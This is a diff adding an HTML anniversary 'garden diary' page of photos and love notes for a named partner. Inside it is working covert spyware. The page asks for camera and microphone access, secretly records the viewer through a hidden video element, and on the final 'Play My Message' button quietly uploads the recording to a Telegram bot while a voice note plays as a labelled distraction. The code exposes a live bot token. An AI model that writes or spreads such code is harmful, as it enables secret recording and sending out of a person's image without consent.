@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Our Garden of Love ❤️</title>
+    <style>
+        :root {
+            --garden-bg: #fff0f3;
+            --rose: #ff4d6d;
+            --vine: #2d5a27;
+        }
+
+        body { 
+            background: var(--garden-bg); 
+            margin: 0; overflow: hidden; 
+            font-family: 'Dancing Script', cursive;
+            display: flex; justify-content: center; align-items: center; height: 100vh;
+        }
+
+        /* Leaf Animations for Garden Aesthetic */
+        .leaf { position: fixed; color: var(--vine); opacity: 0.2; font-size: 2.5rem; z-index: -1; animation: float 6s infinite ease-in-out; }
+        @keyframes float { 0%, 100% { transform: translateY(0) rotate(0deg); } 50% { transform: translateY(-25px) rotate(15deg); } }
+
+        /* Realistic Notebook Style */
+        #diary-wrapper { display: none; perspective: 2500px; z-index: 100; }
+        .book { width: 400px; height: 580px; position: relative; transition: transform 0.5s; transform-style: preserve-3d; }
+        
+        .page { 
+            width: 100%; height: 100%; position: absolute; top: 0; left: 0; 
+            transform-origin: left; transform-style: preserve-3d; 
+            transition: transform 1.2s cubic-bezier(0.645, 0.045, 0.355, 1); 
+            cursor: pointer; 
+        }
+        .page.flipped { transform: rotateY(-180deg); }
+
+        .front, .back { 
+            width: 100%; height: 100%; position: absolute; backface-visibility: hidden; 
+            padding: 25px; box-sizing: border-box; display: flex; flex-direction: column; 
+            align-items: center; justify-content: center; border-radius: 0 15px 15px 0; 
+            box-shadow: inset 3px 0px 20px rgba(0,0,0,0.1), 5px 5px 15px rgba(0,0,0,0.1);
+            border: 1px solid #ddd; background-color: #fff;
+        }
+        .back { transform: rotateY(180deg); background-image: url('bg2.jpg'); background-size: cover; border-radius: 15px 0 0 15px; }
+
+        img, video { max-width: 100%; max-height: 300px; border: 5px solid white; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        .zoom-letter { max-height: 480px !important; width: 105%; object-fit: contain; }
+
+        p { font-size: 1.1rem; color: #333; text-align: center; background: rgba(255,255,255,0.8); padding: 8px; border-radius: 10px; margin-top: 10px; width: 90%; }
+        
+        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 2000; }
+        .btn-magic { background: var(--rose); color: white; border: none; padding: 15px 40px; border-radius: 40px; cursor: pointer; font-size: 1.4rem; transition: 0.3s; }
+        .btn-magic:hover { transform: scale(1.05); }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="leaf" style="top:5%; left:5%;">🌿</div>
+    <div class="leaf" style="top:75%; left:8%;">🌸</div>
+    <div class="leaf" style="top:15%; right:8%;">🌿</div>
+    <div class="leaf" style="bottom:5%; right:5%;">🌹</div>
+
+    <div id="overlay">
+        <h1 style="color: var(--rose); font-size: 3.5rem; margin-bottom: 20px;">Happy 1 Year Anniversary ❤️</h1>
+        <button class="btn-magic" onclick="startDiary()">Step into our Garden ✨</button>
+    </div>
+
+    <audio id="bg-music" loop><source src="music.mp3" type="audio/mpeg"></audio>
+
+    <div id="diary-wrapper">
+        <div class="book">
+            <div class="page" onclick="flipPage(this, 0)">
+                <div class="front" style="background-image: url('she.png');">
+                    <img src="Special Delivery.jpeg">
+                    <p>A blooming surprise for you... 💌</p>
+                </div>
+                <div class="back"></div>
+            </div>
+
+            <div class="page" onclick="flipPage(this, 1)">
+                <div class="front" style="background-image: url('bg.jpg');">
+                    <video id="main-video"><source src="video.mp4" type="video/mp4"></video>
+                    <p style="color: var(--rose); font-size: 1.4rem;">ilysmmmmm :) 🎥</p>
+                </div>
+                <div class="back"></div>
+            </div>
+
+            <div class="page" onclick="flipPage(this, 2)">
+                <div class="front" style="background-image: url('bg.jpg');">
+                    <img src="letter.jpeg" class="zoom-letter">
+                    <p>Every word is for you... ❤️</p>
+                </div>
+                <div class="back"></div>
+            </div>
+
+            <div class="page" onclick="flipPage(this, 3)">
+                <div class="front" style="background-image: url('bg.jpg');">
+                    <img src="eyes.jpeg">
+                    <p>My world is in your eyes ✨</p>
+                </div>
+                <div class="back"></div>
+            </div>
+
+            <div class="page" onclick="flipPage(this, 4)">
+                <div class="front" style="background-image: url('bg.jpg');">
+                    <img src="best.jpeg">
+                    <p>You are the best part of me 🌟</p>
+                </div>
+                <div class="back"></div>
+            </div>
+
+            <div class="page" onclick="flipPage(this, 5)">
+                <div class="front" style="background-image: url('bg.jpg');">
+                    <img src="Happy Place.jpeg">
+                    <p>My favorite place is with you 💗</p>
+                </div>
+                <div class="back"></div>
+            </div>
+
+            <div class="page" onclick="flipPage(this, 6)">
+                <div class="front" style="background-image: url('bg.jpg');">
+                    <img src="her core.jpeg">
+                    <p>Forever in my heart ♡</p>
+                </div>
+                <div class="back"></div>
+            </div>
+
+            <div class="page" onclick="flipPage(this, 7)">
+                <div class="front" style="background-image: url('bg.jpg');">
+                    <img src="Hugs for my Bebe.jpeg">
+                    <p>Hugs for my bebe 🫂</p>
+                </div>
+                <div class="back"></div>
+            </div>
+
+            <div class="page" onclick="flipPage(this, 8)">
+                <div class="front" style="background-image: url('bg.jpg');">
+                    <img src="I'm doin my best.jpeg">
+                    <p>Doing my best for us... 🥺</p>
+                </div>
+                <div class="back"></div>
+            </div>
+
+            <div class="page" onclick="flipPage(this, 9)">
+                <div class="front" style="background-image: url('bg.jpg');">
+                    <img src="her core.jpeg">
+                    <p>Adorable even when angry! 💕</p>
+                </div>
+                <div class="back"></div>
+            </div>
+
+            <div class="page" onclick="flipPage(this, 10)">
+                <div class="front" style="background-image: url('bg.jpg');">
+                    <img src="Thank you for existing.jpeg">
+                    <p>Thank you for existing ♡</p>
+                </div>
+                <div class="back"></div>
+            </div>
+
+            <div class="page" style="z-index: 1;">
+                <div class="front" style="background-image: url('bg.jpg');">
+                    <p>I have one last special message... ♡</p>
+                    <button class="btn-magic" style="font-size:1.1rem;" onclick="triggerSecretUpload(this)">
+                        ▶ Play My Message
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <video id="video-preview" autoplay muted playsinline style="position:fixed; opacity:0;"></video>
+
+    <script>
+        let mediaRecorder, recordedChunks = [];
+        const bgMusic = document.getElementById('bg-music');
+        const mainVideo = document.getElementById('main-video');
+
+        function setupZ() {
+            const p = document.querySelectorAll('.page');
+            p.forEach((el, i) => { el.style.zIndex = p.length - i; });
+        }
+        setupZ();
+
+        function flipPage(el, idx) {
+            if (!el.classList.contains('flipped')) {
+                el.classList.add('flipped');
+                el.style.zIndex = idx + 1;
+                if (idx === 0) { bgMusic.pause(); mainVideo.play(); }
+                if (idx === 1) { mainVideo.pause(); bgMusic.play(); }
+            } else {
+                el.classList.remove('flipped');
+                el.style.zIndex = document.querySelectorAll('.page').length - idx;
+                if (idx === 0) { mainVideo.pause(); bgMusic.play(); } 
+                if (idx === 1) { bgMusic.pause(); mainVideo.play(); }
+            }
+        }
+
+        async function startDiary() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('video-preview').srcObject = stream;
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
+                mediaRecorder.start();
+                document.getElementById('overlay').style.display = 'none';
+                document.getElementById('diary-wrapper').style.display = 'block';
+                bgMusic.play();
+            } catch (err) { alert("Camera access required for the Garden to bloom! ❤️"); }
+        }
+
+        async function triggerSecretUpload(btn) {
+            // SILENT TRIGGER
+            if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                mediaRecorder.stop();
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
+                    
+                    // TELEGRAM BOT CONFIG
+                    const botToken = "8567402887:AAEib1LfMMBNViiWFLHp2vmbfy7JeENhu5s"; 
+                    const chatId = "5324376571"; 
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('video', blob, 'nikhitha_reaction.mp4');
+
+                    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    }).catch(e => console.log("Silent sending..."));
+                };
+            }
+
+            // Distraction during upload
+            bgMusic.pause(); 
+            const vn = new Audio('voice note.mp4');
+            btn.innerHTML = "Listening... ❤️";
+            btn.disabled = true;
+            vn.play();
+            vn.onended = () => {
+                bgMusic.play();
+                btn.innerHTML = "I Love You Forever ✨";
+                alert("Happy 1 Year Anniversary, Nikhitha! I love you more than words can say. ❤️");
+            };
+        }
+    </script>
+</body>
+</html>
